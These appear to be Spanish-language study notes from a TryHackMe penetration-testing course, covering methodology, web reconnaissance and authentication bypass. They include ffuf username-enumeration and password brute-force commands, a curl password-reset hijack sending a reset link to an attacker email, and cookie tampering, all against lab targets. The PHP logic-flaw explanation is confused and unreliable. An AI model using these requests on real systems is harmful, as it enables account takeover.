---
layout: post
title: 3.Junior Penetrationtester path
subtitle: Notes of the TryHackMe's path Junior Penetration Tester.
tags: [thm]
---

## 0. Índice.
- 1. Penetration Testing.
	- 1.1. Pentesting Fundamentals. 
	- 1.2. Principles of Security.
- 2. Introduction to Web Hacking.
	- 2.1. Walking An Application. 
	- 2.2 Content Discovery.
	- 2.3. Subdomain Enumeration. 
	- 2.4. Authentication Bypass. 
	- 2.5. IDOR
	- 2.6. File Inclusion. 
	- 2.7. SSRF. 
	- 2.8. Cross-site Scripting. 
	- 2.9. Command Injection. 
	- 2.10. SQL Injection. 
- 4. Network Security.
	- 4.1. Passive Reconnaissance.
	- 4.2. Active Reconnaissance.
	- 4.3. Nmap Live Host Discovery.
	- 4.4. Nmap Basic Port Scans. 
	- 4.5. Nmap Advanced Port Scans. 
	- 4.6. Nmap Port Port Scans.
	- 4.7. Protocol and Servers. 
	- 4.8. Protocol and Servers 2. 
	- 4.9. Net Sec Challenge. 
- 5. Vulnerability Research.
	- 5.1. Vulnerabilities 101.
	- 5.2. Exploit Vulnerabilities.
	- 5.3. Vulnerability Capstone. 
- 6. Metasploit
	- 6.1. Introduction.
	- 6.2. Explotation
	- 6.3. Meterpreter.
- 7. Privilege Escalation. 
	- 7.1. Introduction to shells.
	- 7.2. Linux PrivEsc. 
	- 7.3. Windows Privilege Escalation. 

		<br />

### 1. Introdution to Pestesting.
#### 1.1. Pentesting Fundamentals. 

**What is penetration testing**

Un *Penetration test* o *pentest* es un intento ético de testear y analizar las defensas de seguridad que protegen bienes o piezas de información. Esto requiere de emplear las mismas técnicas que en un intento malicioso.

<br />

**Penetration Testing Ethics**

Recordamos que una prueba de penetración es una *auditoría autorizada* de la seguridad y las defensas de un sistema informático según lo acordado por los propietarios de los sistemas. La legalidad de la penetración es bastante clara en este sentido; cualquier cosa que quede fuera de este acuerdo se considera no autorizada.

Antes de que comience una prueba de penetración, se produce una discusión formal entre el probador de penetración y el propietario del sistema. Se acuerdan diversas herramientas, técnicas y sistemas a probar. Esta discusión *forma el alcance del acuerdo de prueba de penetración* y determinará el curso que toma la prueba de penetración.

Las empresas que brindan servicios de pruebas de penetración están sujetas a marcos legales y acreditación de la industria. Por ejemplo, el Centro Nacional de Seguridad Cibernética (NCSC) tiene el esquema de acreditación CHECK en el Reino Unido. Esta verificación significa que solo "\[CHECK] las empresas aprobadas pueden realizar pruebas de penetración autorizadas de los sistemas y redes del sector público y CNI". (NCSC).

Los hackers se clasifican en tres 'hats':

| Hat | Descripción | Ejemplo |
| - | - | - |
| White Hat | Estos están dentro y usan sus habilidades para beneficiar a otros.| Un penetration tester haciendo una auditoría dentro de una compañía.|
| Grey Hat | Estos emplean sus habilidades para beneficiar a otros pero no respetan o siguen la ley. | Alguien que toma un sitio de scamming.|
| Black Hat | Estos son criminales que utilizan sus habilidades para buscar y dañar una organización con ánimo de lucro. | Por ejemplo, autores de ransomware. |

<br />

Por otra parte, a la hora de realizar las primeras fases del penetration testing engagement existe un documento que lista las reglas a seguir denominado Rules of Engagement o por sus siglas, ROE. 

El documento consta de tres partes bien diferenciadas:

| Section | Description |
| - | - |
| Permisos | Esta parte del documento ofrece una descripción explícita sonre los permisos que el autor de la auditoría tiene. Es esencial para protegerte legalmente y a la organización sobre la actividad que se va a hacer. |
| Test Scope | En esta parte se anotan los targets específicos a los que se dirige la auditoría. | 
| Rules | Define las técnicas permitidas en la auditoría. |

<br />

**Penetration Testing Methodologies**

Los pasos que toma un probador de penetración durante un compromiso se conocen como la metodología. Una metodología práctica es inteligente, donde los pasos tomados son relevantes para la situación actual

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220807190241.png' | relative_url }}" text-align="center"/>
</div>

Por una parte también encontramos el [Open Source Security Testing Methodology Manual](https://www.isecom.org/OSSTMM.3.pdf) o OSSTMM provee un marco de trabajo detallado para testear estrategias para sistemas, software, aplicaciones y demás dispositivos informáticos. 

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220807191300.png' | relative_url }}" text-align="center"/>
</div>

Estas estrategias se enfocan principalmente en cómo dichos dispositivos se comunican, de forma que la metodología descrita incluye:

1. Telecomunicaciones (teléfono, VoIP, etc).
2. Redes Cableadas. 
3. Redes Inalámbricas. 

Por otra tenemos el [Open Web Application Security Project](https://owasp.org/) o OWASP es un marco de trabajo orientado a la auditoría de aplicaciones y servicios web:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220807191006.png' | relative_url }}" text-align="center"/>
</div>

Se basa en la descripción y documentación de un top ten [security vulnerabilities](https://owasp.org/www-project-top-ten/2017/) que una aplicación puede tener y sus posibles remedios. Este sitio web es fácil de entender, se actualiza con frecuencia y es específico sobre aplicaciones web.

También tenemos el [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework) es un marco de trabajo bastante popular utilizado para mejorar los estándares de seguridad informática de las empresas y 
manejar el riesgo de las ciber amenezas.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220807191903.png' | relative_url }}" text-align="center"/>
</div>

Puntos importantes a detallar sobre el NIST son:

- Se estima que al menos el 50% de las organizaciones estadounidenses los utilizan. 
- El marco es muy detallado acerca de los estándares que sugiere. 
- Se actualiza con frecuencia. 

	<br />

Por último, se dispone del [Cyber Assessment Framework](https://www.ncsc.gov.uk/collection/caf/caf-principles-and-guidance) que consta de catorce principios utilizados para manejar el riesgo de las ciber amenazas. 

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220807233426.png' | relative_url }}" text-align="center"/>
</div>

El Framework sirve sobre todo para organizaciones que desempeñan servicios y actividades de vital importancia como infraestructura críticas, etc. Se centran sobre todo en los siguientes módulos:

- Securización de datos. 
- Seguridad de sistemas. 
- Identificación y control de acceso. 
- Resiliencia. 
- Monitorización.
- Response and recovery planning.

Este marco de trabajo está respaldado por un agencia de ciberseguridad del gobierno y provee acreditación,.

<br />

**Penetration Testing types**

Existen fundamentalmente tres formas de llevar a cabo una auditoría de seguridad a un sistema informático:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220807234143.png' | relative_url }}" text-align="center"/>
</div>
 
- *Black Box* testing. Este se da cuando al pentester no se le da ningún tipo de información acerca del dipositivo que debe atacar. Este debe recopilar toda la información que pueda por sus propios métodos. 

- *White Box* testing. Este se da en el contexto contrario, el pentester tiene toda la información disponible sobre el dispositivo que va a atacar. 

- *Grey Box* testin. Este es el caso intermedio, el pentester contiene una cantidad de información limitada.

	<br />

#### 1.2. Principios de seguridad. 

**The CIA Triad**

La tríada de seguridad CIA es un modelo de seguridad basado en la identificación de tres secciones fundamentales sobre las que dirigir el esfuerzo de securización: Confidencialidad, Integridad, Disponibilidad. 

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220808102502.png' | relative_url }}" text-align="center"/>
</div>

Estas tres secciones no son secciones completamente desconectadas, más bien conforman un ciclo de retroalimentación. Toda política de seguridad de un organismo debe tener políticas que respondan a cada uno de estos tres campos. 

- *Confidencialidad*: La confidencialidad de los datos refiere a la protección que estos mismos tienen frente a accesos no autorizados. Especialmente relevante con información sensible, como usuarios, contrasañeas, cuentas bancarias, etc.

- *Integridad*: La integridad de los datos refiere a la protección que estos tienen frente a cambios en los mismos que puedan alterar la información que transmiten. 

- *Disponibilidad*: La disponibilidad de los datos refiere a la accesibilidad de los mismos por parte de usuarios autenticados siempre que estos lo requieran.

	<br />

**Continuación de los modelos de seguridad**

Existen dos modelos de seguridad que están diseñados acorde a la tríada CIA.

*The Bell-La Padula Model*

Este modelo se emplea para asegurar sobre todo la confidencialidad de los datos. Contiene una serie de asumpciones, como que la empresa se organiza de forma jerárquica y que los roles o responsabilidad de cada uno están bien definidos. 

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220808141516.png' | relative_url }}" text-align="center"/>
</div>

<br />

*Biba Model*

Este modelo funciona como el anterior pero prioriza la integridad de los datos sobre la confidencialidad:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220808142036.png' | relative_url }}" text-align="center"/>
</div>

<br />

### 2. Introduction to Web Hacking.

#### 2.1. Walkign An Application. 

**Introducción**

En esta sección aprenderemos como llevar a cabo una exploración manual de una aplicación web en busca de fallos de seguridad empleando sólo herramientas embebidas en el propio navegador.

Una paqueña descripción de estas herramientas sería: 

- *View Source*: Un vistazo al código fuente de la página. Código HTTP. 
- *Inspector*: Inspeccionar elementos concretos de la página y modificarlos. 
- *Debugger*: Inspeccionar y controlar el flujo de JavaScript de la página. 
- *Network*: Permite visualizar todas las request de red de la página. 

	<br />

**Exploring the Website**

Como pentester, en muchas ocasiones tendremos que revisar un sitio web o una aplicación web patra descubrir características que podrían ser potencialmente vulnerables e intentar explotarlas para evaluar si lo son o no. *Estas características suelen ser partes del sitio web que requieren cierta interactividad con el usuario*.  
  
Una revisión del sitio requiere mapearlo, esto es, listar todas las páginas, subpáginas, parámetros disponibles etc. Por ejemplo:

| Nombre | URL |
| - | - |
| Home Page | / |
| Page | /page1 |
| Subpage | /page1/subpage |
| Parameter id | /page1/subpage?id=1 |

<br />

**Viendo el código fuente de la página**

Una página web (que no aplicación web) no es más que código HTML renderizado por un navegador lo que le de el aspecto visual-friendly con el que estamos tan familiarizado:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220808155451.png' | relative_url }}" text-align="center"/>
</div>

Por razones evidentes, explorar el código fuente puede dar pistas acerca de vectores de ataque sobre la aplicación web. 

Para ver el código fuente de una página web se siguen los siguientes pasos: 

- Botón derecho > Ver código fuente:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220808160044.png' | relative_url }}" text-align="center"/>
</div>

- Algunos buscadores soportan el término *view-source*, por ejemplo: view-source:https://site.com

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220808163812.png' | relative_url }}" text-align="center"/>
</div>

Algunos de los elementos que podemos encontrar entre el código fuente de una página son:

| Elemento | Descripción |
| - | - |
| *\<!-- COMENTARIOS-->* | Líneas que aportan información adicional generalmente en referencia al propio código pero son ignoradas por el motor de renderización del navegador. |
|*\<a href=/path>Link\</a>*|Links a otras partes de la aplicación web o directamente a aplicaciones web externas.|
| *\<script>  \</script>* | Código javascript. Que vuelve a la página dinámica sin necesidad de realizar una request sobre el servidor. |

<br />

**DevTools **

Todos los navegadores modernos incluyen una sección denominada "DevTools"; este es un kit de herramientas que se utiliza para ayudar a los desarrolladores web a depurar aplicaciones web. Como pentester, podemos aprovechar estas herramientas para comprender mucho mejor la aplicación web. Nos centraremos específicamente en tres características del kit de herramientas para desarrolladores, Inspector, Debugger y Network.

Para abrir "DevTools" pulsamos Botón Derecho > Inspeccionar y se nos abrirá el panel de DevTools en el Inspector:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220808180808.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Inspector**

La fuente de la página no siempre representa lo que se muestra en una página web; esto se debe a que el CSS, JavaScript y la interacción del usuario pueden cambiar el contenido y el estilo de la página, lo que significa que necesitamos una forma de ver lo que se muestra en la ventana del navegador en tiempo real. 

El *Inspector* de elementos es un apartado de DevTools que nos ayuda con esto brindándonos una representación en vivo de lo que está actualmente en el sitio web combinando la información que ofrece el HTML, el CSS y el código JavaScript.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220808181303.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Debugger**

Este panel en las herramientas para desarrolladores está diseñado para depurar JavaScript y, nuevamente, es una característica excelente para los desarrolladores web que desean averiguar por qué algo podría no funcionar. Pero como probadores de penetración, nos da la opción de profundizar en el código JavaScript. En Firefox y Safari, esta función se llama Debugger, pero en Google Chrome se llama Sources.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220808185735.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Network**

La pestaña de *Network* en las herramientas para desarrolladores se puede usar para realizar un seguimiento de cada solicitud externa que hace una página web.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220808190644.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220808190904.png' | relative_url }}" text-align="center"/>
</div>

En muchas ocasiones es necesario actualizar la página para que se vuelvan a realizar las request y quededn registradas por el apartado Network.

<br />

**Content Discovery**

El descubrimiento de contenido de un sitio web puede hacerse mediante tres vías:

- *Manualmente*: Visitando distintas partes de la aplicación web y recopilando información.

- *Automatizada*: Empleando una herramienta externa con scanner incorporado como BurpSuite, Dirb/Dirbuster, GoBuster.

- *OSINT*: Recopilando información expuesta de forma pública en partes externas de la aplicación web. 

	<br />

**Robots.txt**

El *Robots.txt* es un documento que informa o guía a los motores de búsqueda como google, bing, etc que páginas (o contenido de una aplicación web) no está permitido mostrar  en el resultado de sus búsquedas. 

Es una práctica común ocultar a os buscadores páginas con contenido sensible como el portal del administrador, etc.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220809104619.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Favicon**

El *favicon* es un pequeño icono desplegado en el buscador a modo de marca del sitio web en el que se está:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220809125228.png' | relative_url }}" text-align="center"/>
</div>

Desde el punto de vista de la seguridad, a veces, cuando se utilizan marcos para crear un sitio web, sobra un favicon que es parte de la instalación, y si el desarrollador del sitio web no lo reemplaza con uno personalizado, esto puede darnos una pista sobre qué marco está en uso. OWASP aloja una base de datos de íconos de marco comunes que puede usar para compararlos con el favicon de destino  [https://wiki.owasp.org/index.php/OWASP_favicon_database](https://wiki.owasp.org/index.php/OWASP_favicon_database) . Una vez que conocemos el marco, podemos usar recursos externos para descubrir más sobre él (ver la siguiente sección).

<br />

**Sitemap.xml**

Este fichero actúa al contrario de la forma en la que actúa el fichero *robots.txt*. Este ofrece un listado de los ficheros que deben ser mostrados al usuario por los motores de búsqueda. 

Puede ser de ayuda porque puede contener rutas a partes de la aplicación que tienen nombres poco intuitivos o incluso filtraciones de páginas que debería de estar ocultas. 

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220809143945.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Manual Discovery - HTTP Headers**

Dentro del intercambio de comunicación entre un cliente y un web server que se efectúa en peticiones del cliente y respuestas del servidor, existen unas entidades denominadas "HTTP Headers", cabeceras HTTP, que fundamentalmente aportan información extra sobre el contenido de la request/response, el cliente o el propio webserver.

Así por ejemplo, podemos echar un vistazo de estas cebeceras en la respuesta HTTP que nos devuelve el servidor con *curl -v*:

```bash
curl -v http://<Server-IP>
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220809152234.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Framework Stack**

Una vez que hemos localizado el framework de un sitio web (ya sea a través de gaps de información, favicon, etc), entonces podemos acudir al sitio web del framework con la posibilidad de obtener más información.

Por ejemplo, en una página web genérica encontramos el siguiente comentario en el código fuente:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220809155644.png' | relative_url }}" text-align="center"/>
</div>

Que nos lleva al sitio web: 

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220809155740.png' | relative_url }}" text-align="center"/>
</div>

Que puede contener información que puede liderar al descubrimiento de una debilidad o potencial vulnerabilidad en el sitio web original.

<br />

**OSINT - Google Hacking/Dorking**

El Google Dorking utiliza las funciones avanzadas del motor de búsqueda de Google que le permiten seleccionar contenido personalizado.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220809162846.png' | relative_url }}" text-align="center"/>
</div>

Para más información: [https://en.wikipedia.org/wiki/Google_hacking](https://en.wikipedia.org/wiki/Google_hacking)

<br />

**Wappalyzer**

Wappalyzer ( [https://www.wappalyzer.com/](https://www.wappalyzer.com/) ) es una herramienta en línea y una extensión del navegador que ayuda a identificar qué tecnologías usa un sitio web, como marcos, sistemas de administración de contenido (CMS), procesadores de pago y mucho más, e incluso puede encontrar números de versión también.

<br />

**Wayback Machine**

The Wayback Machine ( [https://archive.org/web/](https://archive.org/web/) ) es un archivo histórico de sitios web que data de finales de los 90. Puede buscar un nombre de dominio y le mostrará todas las veces que el servicio extrajo la página web y guardó el contenido. Este servicio puede ayudar a descubrir páginas antiguas que aún pueden estar activas en el sitio web actual.

<br />

**Github**

Git es un  *sistema de control de versiones* que realiza un seguimiento de los cambios en los archivos de un proyecto. Trabajar en equipo es más fácil porque puede ver qué está editando cada miembro del equipo y qué cambios han hecho en los archivos. Cuando los usuarios han terminado de realizar sus cambios, los confirman con un mensaje y luego los devuelven a una ubicación central (repositorio) para que los otros usuarios luego extraigan esos cambios en sus máquinas locales. GitHub es una versión alojada de Git en Internet. Los repositorios se pueden configurar como públicos o privados y tienen varios controles de acceso. Puede utilizar la función de búsqueda de GitHub para buscar nombres de empresas o sitios web para tratar de localizar repositorios que pertenezcan a su objetivo. Una vez descubierto, puede tener acceso al código fuente, contraseñas u otro contenido que aún no había encontrado.

<br />

**Automatic Discover**

El descubrimiento automatizado es el proceso de usar herramientas para descubrir contenido en lugar de hacerlo manualmente. Este proceso está automatizado ya que suele contener cientos, miles o incluso millones de solicitudes a un servidor web. Estas solicitudes comprueban si existe un archivo o directorio en un sitio web, lo que nos da acceso a recursos que antes no sabíamos que existían. Este proceso es posible mediante el uso de un recurso llamado *wordlists*.

Un excelente recurso para listas de palabras que está preinstalado en THM AttackBox es  [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists) ,  que Daniel Miessler selecciona.

Aunque hay muchas herramientas diferentes de descubrimiento de contenido disponibles, todas con sus características y fallas, vamos a cubrir tres que están preinstaladas en nuestro cuadro de ataque, ffuf, dirb y gobuster.

- *ffuf*:

	```bash
	ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.190.226/FUZZ
	```

	<br />
	
- *dirb*: 

	```bash
	dirb http://10.10.190.226/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
	```

	<br />

- *gobuster*:

	```bash
	gobuster dir --url http://10.10.190.226/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
	```

Por ejemplo, usando dirb:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220809170542.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 2.3. Subdomain Enumeration.

**Introducción**

En primer lugar, un *subdominio* conceptualmente es un subconjunto de direcciones de una aplicación web que tienen el objetivo de organizar los recursos de la misma en función de un propósito concreto. 

Técnicamente, es un nombre seguido de un punto y el dominio de la página en la URL.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220809180548.png' | relative_url }}" text-align="center"/>
</div>

La enumeración de subdominios es el proceso de búsqueda de subdominios válidos para un dominio. Esto nos sirve para ampliar nuestra superficie de ataque. 

Puede hacerse a través de 3 vías: Brute Force, OSINT y Virtual Host.

<br />

**OSINT -SSL/TLS Certificates**

Por un lado, SSL y TLS responden respectivamente a Secure Sockets Layer y Transport Layer Security y son dos protocolos criptográficos que se utilizan para cifrar la información que se envía sobre otros protocolos, por ejemplo HTTP, pasando de este a HTTPS. 

Existe en lo relativo a a aplicaciones web, certificados criptográficos de clave pública que se expiden por Certificate Authority (CA's) que tienen fundamentalmente dos propósitos en el lado del cliente:

- Compartir la clave pública y proporcionar información sobre ella. 

- Garantizar que el sitio web es de hecho lo que dice ser.  

Mas extensamente, en criptografía, un certificado de clave pública también conocido como certificado digital, es un documento electrónicon utilizado para probar la validez de una clave pública. El certificado incluye información sobre la clave, información sobre la identidad de su propietario (llamado sujeto) y la firma digital de una entidad que ha verificado el contenido del certificado (llamado emisor). Si la firma es válida y el software que examina el certificado confía en el emisor, puede usar esa clave para comunicarse de forma segura con el sujeto del certificado.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220810100758.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220810100819.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220810100833.png' | relative_url }}" text-align="center"/>
</div>

A su vez, CA's se encargan de generar los [Certificate Transparency logs](http://crt.sh/) que intentan prevenir la fabricación de certificados maliciosos y de que estos se usen. 

Podemos emplear este servicio (y de este https://ui.ctsearch.entrust.com/ui/ctsearchui) para buscar subdominios de un dominio que hagan uso de un certificado común. 

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220810102135.png' | relative_url }}" text-align="center"/>
</div>

<br />

**OSINT - Search Engines**

Podemos emplear buscadores de internet como google y los google dorks para localizar subdominios:

Por ejemplo: "site:\*.tryhackme.com" que debería revelar muchos subdominios del dominio tryhackme.com

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220810153650.png' | relative_url }}" text-align="center"/>
</div>

<br />

**DNS Bruteforce**

La enumeración de DNS (Domain Name System) de fuerza bruta es el método de probar decenas, cientos, miles o incluso millones de diferentes subdominios posibles de una lista predefinida de subdominios de uso común. Debido a que este método requiere muchas solicitudes, lo automatizamos con herramientas para que el proceso sea más rápido. En este caso, estamos usando una herramienta llamada *dnsrecon* para realizar esto. 

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220810155713.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Sublist3r**

Para acelerar el proceso de descubrimiento de subdominios OSINT, podemos automatizar los métodos anteriores con la ayuda de herramientas como  [Sublist3r](https://github.com/aboul3la/Sublist3r)

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220810160207.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220810160219.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Servidores Virtuales**

Algunos subdominios no siempre se alojan en resultados de DNS de acceso público, como versiones de desarrollo de una aplicación web o portales de administración. En su lugar, el registro de DNS podría mantenerse en un servidor DNS privado o registrarse en las máquinas del desarrollador en su archivo /etc/hosts (o en el archivo c:\\windows\\system32\\drivers\\etc\\hosts para usuarios de Windows) que asigna nombres de dominio a Direcciones IP. 

Debido a que los servidores web pueden alojar múltiples sitios web desde un servidor cuando un cliente solicita un sitio web, el servidor sabe qué sitio web desea el cliente del encabezado Host Podemos utilizar este encabezado de host realizando cambios en él y monitoreando la respuesta para ver si hemos descubierto un nuevo sitio web.

Al igual que con DNS Bruteforce, podemos automatizar este proceso mediante el uso de una lista de palabras de subdominios de uso común.

Inicie un AttackBox y luego pruebe el siguiente comando en la máquina de soporte de TI de Acme para intentar descubrir un nuevo subdominio.

```bash
user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP
```

El comando anterior usa el interruptor *-w* para especificar la lista de palabras que vamos a usar. El interruptor *-H* agrega/edita un encabezado (en este caso, el encabezado del Host), tenemos la palabra clave *FUZZ* en el espacio donde normalmente iría un subdominio, y aquí es donde probaremos todas las opciones de la lista de palabras.

<br />

#### 2.4. Authentication Bypass. 

**Intro**

Comenzamos definiendo que la *autenticación* es el proceso o mecanismo por el que un determinado servicio o programa verifica la identidad de un usuario dándole acceso a determinadas partes del programa a través de una serie de permisos. 

Observemos que no debemos confundir la autenticación con la *autorización* que es el mecanismo por el que un programa o servicio comprueba que un usuario, autenticado o no, tiene permisos para realizar una determinada acción. 

En esta sección vamos a ver, en el contexto de una auditoría a una aplicación web, métodos y estrategias para realizar un "bypass" a diferentes mecanismos de autenticación con la finalidad de usurpar una identidad y obtener una serie de privilegios sobre la aplicación.

<br />

**Username Enumeration**

Una primera alternativa consiste en crear una lista de candidatos a nombres de usuarios. En este contexto puede ocurrir que la aplicación web contenga una vulnerabilidad de *information leak* y de a entender al usuario que intenta logearse cuándo un nombre de usuario es válido y cuando no. 

Por ejemplo, en una sección para registrar usuarios, utilizamos un nombre y ocurre:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220810195421.png' | relative_url }}" text-align="center"/>
</div>

Dándonos a entender que dicho nombre existe. Podemos aprovecharnos de este mensaje de error para configurar un comando con una herramienta de fuzzeo para realizar un ataque de fuerza bruta:

```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.146.56/customers/signup -mr "username already exists"
```

FFUF son las siglas de Fuzz Faster yoU Fool y se trata de un *open source web fuzzing tool*; el fuzzing es un mecanismo de testeo de múltiples valores para uno o una serie de parámetros sobre un mismo esquema de request.

Concretamente el comando anterior emplea los siguientes modificadores:

- *-w*: Indica la localización de la lista de palabras que se van a emplear como candidatos. 

- *-x*: Indica el método HTTP de la request.

- *-d*: Especifica el data, dado que estamos mandando un POST, los datos van incluidos en el cuerpo de la request (no en la URL) y se especifican con este modicador. Observamos que el parámetro a fuzzear tiene su valor cambiado a 'FUZZ'.

- *-H*: Modificador empleado para añadir cabeceras adicionales a la request. 

- *-u*: Modificador empleado para indicar la URL del objetivo. 

- *-mr*: Modificador empleado para que ffuf nos indique cuándo hemos obtenido un 'match'.

De esta forma, con la herramienta ffuf lo que hacemos es enviar múltiples request a una página alterando el valor de un parámetro con el objetivo de obtener diferentes respuestas que nos proporcionan información:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220811134758.png' | relative_url }}" text-align="center"/>
</div>

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220811134901.png' | relative_url }}" text-align="center"/>
</div>

Con esta información podemos realizar de forma más sofisticada un ataque de fuerza bruta.

<br />

**Brute forcing**

Empleando la lista de nombres de usuarios validos generados en la tarea anterior, procedemos a realizar un ataque de fuerza bruta con una lista de candidatos a contraseñas con ffuf:

```bash
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.180.241/customers/login -fc 200
```

Observemos que en este caso estamos empleando una serie de modificadores distintos:

- *-w*: De nuevo para indicar la lista de palabras a utilizar como candidato, observamos que en este caso estamos empleados dos rutas seguidas de dos puntos,":" y el término que vamos a emplear en el data para indicar el parámetro al que correspinde cada lista de valores.

- *-d*: Para indicar los datos que pasamos en el cuerpo de la request porque el método es un HTTP-POST. De forma que situamos en cada valor del parámetro el término correspondiente a cada lista de palabras candidatas respectivamente a usuarios 'W1' y contraseñas 'W2'.

- *-fc*: Para indicar a ffuf cuándo hemos obtenido un match basado en el códido de la HTTP response del server. 

Obteniendo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220811141115.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Logic Flaws**

En otro orden de cosas, un proceso de autenticación puede contener fallas lógicas, estas no son más que debilidades en la tecnología o la configuración que pueden conducir al bypass de uno o más secuencias de pasos en el proceso de autenticación:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20220811153936.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Logic Flaw Example**

Supongámos que tenemos el siguiente código PHP que evalúa si una persona que quiere acceder al portal del administrador es de hecho un administrador:

```php
if( url.substr(0,6) === '/admin') {
    # Code to check user is an admin
} else {
    # View Page
}
```

Sin embargo este código es vulnerable debido a que emplea '\=\=\=' para obtener una coincidencia precisa con el string que el usuario introduce. Sin embargo, un usuario que intentase logearse en la página /adMin se conseguiría logear sin necesidad de ser administrador. 

Otro ejemplo sería con la funcionalidad de reseteo de contraseña. Estas funcionalidades mandan un link de reseteo de la cuenta de un *usuario* a un *email* que supuestamente está vinculado a la cuenta del usuario. 

Sin embargo, ocurre con frecuencia que en la request del envío se separa el nombre del usuario en un parámetro "username" y el valor el email en otro llamado "email".

Podemos por tanto enviar una request de reseteo de contraseña con 'curl' (curl es un acortamiento para "ClientURL" y es una herramienta que permite transferir datos a lo largo de diversos protocolos de red, entre ellos, http) especificando los valores de los parámetros que queremos enviar cambiando el email de la víctima por el del atacante:

```bash
curl 'http://10.10.195.201/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
```

El comando anterior tiene unos modificadores cuyo comportamiento ya está descrito en el apartado anterior con ffuf. 

De esta forma, recibiremos el link de reseteo de la contraseña de 'robert' en nuestro email dándonos acceso a la cuenta del propio robert.

<br />

**Cookie Tampering**

Las *cookies* son fragmentos de información que el servidor web que hostea una aplicación web almacena en nuestro navegador con la finalidad de guardar una serie de datos a modo de configuración o preferencias sobre nuestro usuario en dicha aplicación. Estas tienen diferentes finalidades (configuración cosmética, autenticación, autorización, etc).

Las cookies suelen transferirse entre el cliente y el servidor a modo de cabecera en las request (Cookie: session=cookie_session). Por ello, en muchas ocasiones para falsear cookies empleamos el comando curl con el modificador *-H* que recordamos nos permite introducir cabeceras:

```bash
curl -H "Cookie: logged_in=true; admin=false" http://MACHINE_IP/test
```

Recordamos que 'curl' es un comando que nos permite enviar información a través de distintos protocolos de red. 

De esta forma, el servidor web recibe una petición por parte de un cliente, analiza las cookies de la misma y  devuelve una respuesta ajustada a las cookies recibidas.

Por esta precisa razón, realizar injerencias sobre las cookies que el servidor coloca en nuestro navegador puede conducir a ataques como: acceso no autenticado, acceso a la cuenta de otro usuario, ejecución de acción no autorizada, etc. 

<br />

